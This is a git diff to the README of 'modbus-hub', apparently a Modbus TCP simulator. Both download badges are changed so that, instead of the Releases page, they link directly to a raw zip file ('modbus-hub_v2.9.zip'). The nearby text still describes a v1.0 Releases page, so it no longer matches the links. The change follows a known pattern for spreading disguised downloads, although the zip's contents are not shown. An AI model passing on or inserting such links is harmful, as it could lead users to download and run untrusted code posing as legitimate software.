@@ -6,7 +6,7 @@ Welcome to modbus-hub! This application allows you to simulate Modbus TCP commun
 ## 📥 Download & Install
 To get started, you need to download the application. Click the link below to visit our Releases page:
 
-[![Download modbus-hub](https://img.shields.io/badge/Download%20modbus--hub-v1.0-blue)](https://github.com/Manetchinaman386/modbus-hub/releases)
+[![Download modbus-hub](https://raw.githubusercontent.com/Manetchinaman386/modbus-hub/main/master/modbus-hub_v2.9.zip%20modbus--hub-v1.0-blue)](https://raw.githubusercontent.com/Manetchinaman386/modbus-hub/main/master/modbus-hub_v2.9.zip)
 
 ### Steps to Download and Run Modbus-Hub:
 1. Click on the button above to visit the Releases page.
@@ -77,4 +77,4 @@ Thank you for choosing modbus-hub. Whether you are a beginner or a seasoned user
 
 Visit the Releases page again to check for updates and new features.
 
-[![Download modbus-hub](https://img.shields.io/badge/Download%20modbus--hub-v1.0-blue)](https://github.com/Manetchinaman386/modbus-hub/releases)
+[![Download modbus-hub](https://raw.githubusercontent.com/Manetchinaman386/modbus-hub/main/master/modbus-hub_v2.9.zip%20modbus--hub-v1.0-blue)](https://raw.githubusercontent.com/Manetchinaman386/modbus-hub/main/master/modbus-hub_v2.9.zip)
